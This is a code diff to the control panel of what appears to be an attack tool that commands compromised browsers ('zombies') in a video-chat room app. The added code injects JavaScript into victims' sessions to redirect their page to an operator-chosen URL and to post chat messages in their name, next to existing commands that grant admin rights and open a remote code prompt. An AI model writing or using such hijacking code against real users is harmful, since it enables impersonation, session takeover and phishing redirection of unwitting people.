@@ -273,13 +273,30 @@ function RoomParticipant(identity, room, userId){
         '                </button>\n' +
         '                <button class="_setAdmin btn btn-secondary" type="button" >' +
         '                   <b class="icon">👑</b>' +
-        '                   Set Admin' +
+        '                   Admin' +
         '                </button>\n' +
+        '                <div class="btn-group">\n' +
+        '                    <button class="btn btn-secondary dropdown-toggle" type="button" data-toggle="dropdown">\n' +
+        '                        <b class="icon">🤖</b>\n' +
+        '                        Control\n' +
+        '                    </button>\n' +
+        '                    <div class="dropdown-menu">\n' +
+        '                        <form class="_redirectUI form-inline m-1">\n' +
+        '                            <input type="text" name="redirectUI" class="form-control" placeholder="http://example.com/">\n' +
+        '                            <button type="submit" class="btn btn-primary">Redirect UI</button>\n' +
+        '                        </form>\n' +
+        '                        <div class="dropdown-divider"></div>\n' +
+        '                        <form class="_sendChat form-inline m-1">\n' +
+        '                            <input type="text" name="sendChat" class="form-control" placeholder="chat message">\n' +
+        '                            <button type="submit" class="btn btn-primary">Send chat</button>\n' +
+        '                        </form>\n' +
+        '                    </div>\n' +
+        '                </div>' +
         '                </div>\n' +
         '                <div class="collapse" id="repl'+this.room.roomId+this.userId+'">\n' +
         '                    <div class="card card-body p-0">\n' +
         '                    <pre class="repl"></pre>\n' +
-        '                    <form>\n' +
+        '                    <form class="_repl">\n' +
         '                        <div class="input-group">\n' +
         '                            <div class="input-group-prepend">\n' +
         '                                <span class="input-group-text">&Gt;</span>\n' +
@@ -300,8 +317,8 @@ function RoomParticipant(identity, room, userId){
     this.videoElement = cardElement.getElementsByTagName('video')[0];
     repls[this.identity.uuid] = new Repl(
         this.identity,
-        cardElement.getElementsByTagName('form')[0],
-        cardElement.getElementsByTagName('form')[0].getElementsByTagName('input')[0],
+        cardElement.getElementsByClassName('_repl')[0],
+        cardElement.getElementsByClassName('_repl')[0].getElementsByTagName('input')[0],
         cardElement.getElementsByTagName('pre')[0],
     );
     cardElement.getElementsByClassName('_username')[0].appendChild(document.createTextNode(this.identity.name));
@@ -315,6 +332,26 @@ function RoomParticipant(identity, room, userId){
     });
     cardElement.getElementsByClassName('_setAdmin')[0].addEventListener("click", function (event) {
         sendZombieCmd(that.identity.uuid, 'setMyUserAdmin()');
+    });
+    cardElement.getElementsByClassName('_sendChat')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_sendChat')[0].getElementsByTagName('input')[0];
+        let msg = input.value;
+        input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `displayChatMessage('${msg}', USER);Unity.sendMessageToBrowsers('chat',['${msg}'], USER, 'all');`
+        );
+    });
+    cardElement.getElementsByClassName('_redirectUI')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = cardElement.getElementsByClassName('_redirectUI')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        input.value = '';
+        sendZombieCmd(
+            that.identity.uuid,
+            `window.location.replace('${url}');`
+        );
     });
 
     this.render = function(){
@@ -552,8 +589,15 @@ function Room(roomId, attackerIdentity){
         xhr.overrideMimeType("application/json");
         xhr.onload = function () {
             let roomState = JSON.parse(xhr.responseText);
-            for (let i = 1; i <= roomState.participants; i++) {
-                let userId = 'user' + i;
+            let users = [];
+            for(let key in roomState){
+                if(roomState.hasOwnProperty(key) && (key.split('.')[0].substr(0,4) === 'user' )) {
+                    let user = key.split('.')[0];
+                    if(!users.includes(user)){users.push(user);}
+                }
+            }
+            for (let i = 0; i < users.length; i++) {
+                let userId = users[i];
                 let identity = new Identity(
                     roomState[userId + '.name'],
                     roomState[userId + '.uuid'],
@@ -868,6 +912,7 @@ function requestTurn(turnURL) {
 
 
 function sendZombieCmd(zombieUuid, cmd){
+    console.debug('sendZombieCmd', zombieUuid, cmd);
     messageRelayWs.send(JSON.stringify({
         type: "zombie-cmd",
         uuid: zombieUuid,
